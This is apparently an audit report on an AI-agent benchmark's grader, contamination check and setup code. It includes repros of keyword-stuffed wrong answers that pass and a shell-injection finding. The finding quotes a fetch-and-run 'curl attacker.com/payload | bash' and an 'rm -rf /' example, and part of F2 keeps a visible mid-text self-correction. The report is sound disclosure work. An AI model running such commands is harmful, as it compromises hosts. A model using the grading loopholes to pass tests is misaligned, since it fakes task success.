# copeca Grading Audit Report

Scope: correctness grading, edit-task test path, contamination defense.
Audited: `src/copeca/tasks/validator.py`, `mutations.py`, `orchestration/run.py`,
`orchestration/check.py`, `orchestration/state.py`, `scripts/contamination_check.py`,
`scripts/contamination_blocklist.txt`, task YAML corpus, test suite, docs.

---

## 1. Claims Ledger

| # | Location | Claim | Verdict |
|---|----------|-------|---------|
| L1 | README.md:64 | "Correctness: String matching (comprehension tasks) or test-command exit codes (edit tasks)" | ACCURATE — but the string matching semantics (forbidden uses AND not OR) are not disclosed |
| L2 | README.md:65 | "`all_of` field verifies the agent listed *everything* — not just *something*" | ACCURATE — all_of requires ALL strings |
| L3 | README.md:124-127 | "before a task enters the corpus, copeca probes the model with the task ID alone — if it reproduces the gold solution from memory, the task is excluded" | THEATER — no model is ever probed; this is a static blocklist string-match |
| L4 | docs/tend/features/copeca-task-corpus.tend.html:2682 | "Implement: build_probe() creates task_name + first 10 prompt words, check_contamination() flags tasks … Run as pre-commit hook and CI gate." | PARTIAL THEATER — implemented as pure function, NOT wired as pre-commit hook or CI gate; no `.github/` exists |
| L5 | README.md:109 | "the baseline is provably clean — it never inherits the host's ambient hooks" | ACCURATE — `provision_arm` creates isolated config dirs |
| L6 | docs/tend/.../copeca-task-corpus.tend.html:2803 | "contamination_check verifies no contaminated tasks" | MISLEADING — the check is a static name-prefix match, not a model probe |
| L7 | README.md:120-122 | "Every edit task is verified by `copeca check-task`: the test must pass on clean code and fail on mutated code" | ACCURATE — check.py implements this pipeline correctly |
| L8 | README.md:65 | "`forbidden_strings` [implied: any forbidden present → fail]" | WRONG — bug: task passes if only a subset of forbidden strings appear |

---

## 2. Findings

---

### F1 — Grading Wrong-Answer Pass (Keyword-Stuffing Oracle)
**Severity: HIGH**
**Claim:** "String matching … or test-command exit codes" (README:64)
**Evidence:** `src/copeca/tasks/validator.py:25-28`

```python
def _check_strings(text: str, strings: list[str]) -> bool:
    """Check that all strings appear in text (case-insensitive substring)."""
    lowered = text.lower()
    return all(s.lower() in lowered for s in strings)
```

Matching is: case-insensitive, substring (no word boundary), whitespace-sensitive.
`required_strings` checks that all listed strings appear as substrings. There is no
reasoning validation, no token context, no word-boundary requirement.

**Repro A — Wrong answer PASSES:**
```
ground_truth.required_strings = ["Matcher", "trait", "RegexMatcher", "GlobMatcher"]
ground_truth.all_of            = ["RegexMatcher", "GlobMatcher"]

Agent output: "The Matcher is a struct defined in src/main.rs that wraps search logic.
The trait RegexMatcher is implemented in the standard library.
GlobMatcher is found in /usr/lib/rust/glob.rs and has no methods.
The Matcher trait does not exist in ripgrep — you may be confused."

Verdict: correct=True, required_strings_passed=True, all_of_passed=True,
         forbidden_strings_passed=True, reason='All checks passed'
```
The agent's answer is factually wrong about every claim (Matcher is a trait not a struct,
RegexMatcher/GlobMatcher are not from std lib), yet it scores CORRECT because the
keyword strings appear as substrings.

**Fix:** Document this limitation explicitly in known-limitations.md and the README grading
table. Optionally add word-boundary matching for single-word required_strings. Required
effort: LOW (docs), MEDIUM (word-boundary option).

---

### F2 — Grading Right-Answer Fail (Synonym/Paraphrase Blindness)
**Severity: HIGH**
**Evidence:** `validator.py:25-28` (same function)

**Repro B — Correct paraphrase FAILS:**
```
ground_truth.required_strings = ["Matcher", "trait", "RegexMatcher", "GlobMatcher"]

Agent output: "The Matcher interface (a trait) is the core abstraction for search in
ripgrep. Two concrete types implement it: regex_matcher (which handles RE2 patterns)
and glob_matcher (for file glob patterns). The regex implementation is in the
grep-regex crate; the glob one is in grep-glob."

Verdict: correct=False, required_strings_passed=False, all_of_passed=False,
         reason='missing required strings; missing all_of entries'
```
`regex_matcher` does not match `RegexMatcher` (case-sensitive substring: `regexmatcher`
vs `regexmatcher` — wait, both are lowercased). Let me be precise: `"RegexMatcher".lower()
= "regexmatcher"`, and `"regex_matcher".lower() = "regex_matcher"` — the underscore
means `"regexmatcher" in "regex_matcher"` is False. So correct answers using underscore
naming conventions or alternate casing fail. This is correct grading behavior for these
specific required_strings (they are proper names), but it means a correct answer that
uses the idiomatic `regex_matcher` (with underscore) will fail.

**Fix:** Required strings should be chosen to match the exact canonical identifiers in the
codebase, documented as exact-match tokens. Effort: LOW (documentation + task authoring
guide update).

---

### F3 — `forbidden_strings` AND Logic Bug (Partial Refusal Passes)
**Severity: HIGH**
**Claim (implied):** Any forbidden string present → task fails
**Evidence:** `validator.py:62-64`

```python
if ground_truth.forbidden_strings:
    detail.forbidden_strings_passed = not _check_strings(
        result_text, ground_truth.forbidden_strings
    )
```

`_check_strings` uses `all(...)` — requires ALL listed strings to appear for it to
return True. `NOT all(...)` means the task PASSES unless ALL forbidden strings appear.
If the list is `["I cannot", "unable to"]`, an answer containing only `"I cannot"`
but not `"unable to"` passes the forbidden check.

**Repro — Partial refusal passes on t001_find_matcher_trait:**
```
forbidden_strings = ["I cannot", "unable to"]

Agent output: "I cannot give you a definitive answer. However, the Matcher trait is
defined somewhere in ripgrep. From what I know, RegexMatcher and GlobMatcher implement
it. I'm not sure."

Verdict: correct=True, required_strings_passed=True, all_of_passed=True,
         forbidden_strings_passed=True  <-- BUG (should be False)
         reason='All checks passed'
```

**Scope:** 10 of 16 tasks use `forbidden_strings: ["I cannot", "unable to"]`.
All 10 are affected. A hedging agent that says "I cannot be certain, but ..." while
naming the required symbols scores CORRECT on all 10.

**Fix:** Change the forbidden check to `any(...)` semantics:
```python
# validator.py:62
detail.forbidden_strings_passed = not any(
    s.lower() in result_text.lower() for s in ground_truth.forbidden_strings
)
```
Effort: TRIVIAL (1-line fix + test update).

**Related tend:** `copeca-validate-tasks.tend.html`, `accuracy-blind-claims.tend.html`

---

### F4 — Contamination Defense: "Model Probe" Claim Is Theater
**Severity: HIGH**
**Claim:** README.md:124-127: "copeca probes the model with the task ID alone — if it
reproduces the gold solution from memory, the task is excluded"
**Evidence:** `scripts/contamination_check.py:1-87`

The function `check_contamination()` (line 37) is a pure Python function with zero LLM
calls, zero network calls, zero subprocess calls. The only imports are `from __future__
import annotations`. It performs three static string checks:
1. Task name startswith a blocklist prefix
2. `task_name + first_10_prompt_words` contains a blocklist substring
3. Any `required_strings` entry contains a blocklist substring

The "model probe" described in the README never happens. The blocklist contains only
three entries: `swe-bench-verified`, `humaneval_`, `mbpp_` — known deprecated
benchmark ID prefixes. None of the 16 shipped tasks have these prefixes, so the
contamination check is effectively a no-op for the entire current corpus.

**Additionally: not wired into any pipeline.**
- `scripts/contamination_check.py` is never imported by any file in `src/copeca/`.
- It is not called by `copeca validate`, `copeca run`, `copeca check-task`, or any CLI command.
- There is no `.github/` directory, so no CI runs it.
- `scripts/smoke_test.sh:11` runs it manually but with the note: `|| echo "Contamination check
  not run (no blocklist entries flag)"` — it silently passes if the script fails.
- The only callers are in `tests/tasks/test_contamination_check.py` (unit tests of the
  pure function) and `tests/tasks/test_full_corpus.py`.

**Classification: implemented+manual-only, and the README claim (model probe) does not
match what is implemented (static string match).**

**Fix:** Either (a) update README.md to say "static blocklist check against known-deprecated
task ID prefixes" (accurate), or (b) implement actual model probing and wire it into
`copeca validate`. Fix the smoke_test.sh silent-fail. Effort: LOW (docs), HIGH (actual probe).

**Related tend:** `contamination-erodes-trust.tend.html`

---

### F5 — `mode.setup` Shell Injection via `shell=True`
**Severity: MEDIUM** (trusted-by-merge contributor surface, not end-user data)
**Evidence:** `src/copeca/orchestration/state.py:99-113`

```python
def _run_setup_commands(commands: list[str], cwd: Path) -> None:
    for cmd in commands:
        result = subprocess.run(
            cmd,          # <-- a raw string from mode.setup YAML
            cwd=str(cwd),
            capture_output=True,
            text=True,
            shell=True,   # <-- line 107: shell=True with string input
        )
```

`mode.setup` is a `list[str]` field on `Mode` (models.py:147). Each string is passed
directly to `subprocess.run(shell=True)` meaning it is executed by `/bin/sh -c <cmd>`.
A mode YAML with `setup: ["curl attacker.com/payload | bash"]` or
`setup: ["rm -rf /; echo pwned"]` would execute verbatim when `copeca run` provisions
the arm.

Mode YAMLs are user-authored scenario files, not bundled tasks. They are not reviewed
by the task corpus validation pipeline. Any contributor who submits a scenario with a
malicious `setup` command and gets it merged (or runs a scenario locally) gains arbitrary
code execution on the runner host.

**Repro (benign marker only):**
```python
# Simulating state.py:102-108
malicious_cmd = "echo pwned > /tmp/scratch_grading/INJECT_PWN"
subprocess.run(malicious_cmd, cwd="/tmp", capture_output=True, text=True, shell=True)
# Result: /tmp/scratch_grading/INJECT_PWN written with content 'pwned\n'
# Confirmed executed.
```

**Contrast:** `run.py:80-86` and `check.py:82-88` both run `test_command` as a list
(shell=False by default) — those are safe. Only `state.py:107` uses `shell=True`.

**Fix:** Change `_run_setup_commands` to accept `list[list[str]]` (each command as
an argv list, not a shell string), or at minimum document that `mode.setup` accepts
argv lists and enforce `list[list[str]]` in the `Mode` model. Effort: LOW.

---

### F6 — Edit Task: `required_strings` Are Diagnostic-Only But Not Disclosed
**Severity: MEDIUM**
**Claim:** README.md:64 table lists "Correctness: String matching … or test-command exit
codes" without noting that for edit tasks, string matching is *ignored*.
**Evidence:** `validator.py:95-112`

```python
elif isinstance(ground_truth, EditGroundTruth):
    # Edit: test_command is authoritative
    detail.all_of_passed = None
    if test_command_passed is not None:
        detail.test_command_passed = test_command_passed
        correct = test_command_passed  # strings are never consulted
```

For edit tasks, `required_strings`, `forbidden_strings`, and `all_of` are computed but
never affect the `correct` verdict. An edit task answer can contain every forbidden
string and still score CORRECT if the test passes. This is the intended design
(docstring says "strings are diagnostic only") but it's not disclosed in the README
table or known-limitations.

**Fix:** Add a note to README and docs/methodology.md: "For edit tasks, `required_strings`
and `forbidden_strings` are recorded for diagnostic purposes only; only the test command
exit code determines correctness." Effort: LOW.

---

### F7 — Contamination Check Silently Passes on Any Script Error
**Severity: LOW**
**Evidence:** `scripts/smoke_test.sh:11`

```bash
python scripts/contamination_check.py --tasks-dir tasks/ --blocklist scripts/contamination_blocklist.txt 2>/dev/null || echo "Contamination check not run (no blocklist entries flag)"
```

The `|| echo ...` means any non-zero exit from `contamination_check.py` is silently
swallowed. The script has no `--tasks-dir` or `--blocklist` argparse interface
(confirmed: running with `--help` exits 0 with no output). Any invocation via the
smoke_test.sh will silently fail and print the fallback message, making it appear
the check ran but "didn't flag anything."

**Fix:** Either add a proper CLI to `contamination_check.py` or remove the invocation
from `smoke_test.sh`. Effort: LOW.

---

## 3. Genuinely Good

**G1 — Edit task test pipeline is solid.** `check.py:verify_mutation_validity` correctly
implements the "test passes on clean, fails on mutated" invariant with real subprocess,
real git worktrees, env isolation (`PYTHONDONTWRITEBYTECODE`), and proper cleanup in
`finally`. The logic is correct and the fixture tasks (edit_valid, edit_weak) cover both
positive and negative cases.

**G2 — Grading field separation is clean.** The `CorrectnessDetail` dataclass records
each sub-check independently. The JSONL record preserves all four fields
(`required_strings_passed`, `all_of_passed`, `forbidden_strings_passed`,
`test_command_passed`), enabling post-hoc audit of why tasks passed or failed.

**G3 — `all_of` semantics are correct.** `all_of` correctly requires ALL listed strings
(via the same `_check_strings` function). A task with `all_of: ["Alpha", "Beta", "Gamma"]`
fails if any one is absent. Confirmed by repro.

**G4 — `test_command` uses safe subprocess (list argv).** `run.py:80-86` and `check.py:82-88`
both pass `test_command` as `list[str]` to `subprocess.run` without `shell=True`.
Shell injection via task YAML `test_command` is not possible.

**G5 — Mutation engine is correct.** The `replace`, `delete`, `insert_after`, and
`create` actions all handle their error cases (missing file, unmatched find) with
explicit `MutationError` before any mutation is applied. Occurrence-indexed replacement
logic is correct.

**G6 — Vendor cost cross-check is implemented.** `run.py:132-139` computes costs from
raw token counts and warns when vendor-reported cost diverges >5%. This is an honest
skeptical feature — it does not trust vendor self-reports.

---

## 4. Matching Tend Feature Files

| Finding | Related tend file |
|---------|------------------|
| F1, F2 (grading semantics) | `accuracy-blind-claims.tend.html` |
| F3 (forbidden_strings bug) | `accuracy-blind-claims.tend.html`, `copeca-validate-tasks.tend.html` |
| F4 (contamination theater) | `contamination-erodes-trust.tend.html`, `copeca-task-corpus.tend.html` |
| F5 (shell injection) | `no-verifiable-results.tend.html` (integrity claim) |
| F6 (edit task strings diagnostic) | `copeca-validate-tasks.tend.html` |
| F7 (smoke_test silent fail) | `contamination-erodes-trust.tend.html` |

---

*Report generated by audit of /tmp/copeca_audit at 2026-06-20.*
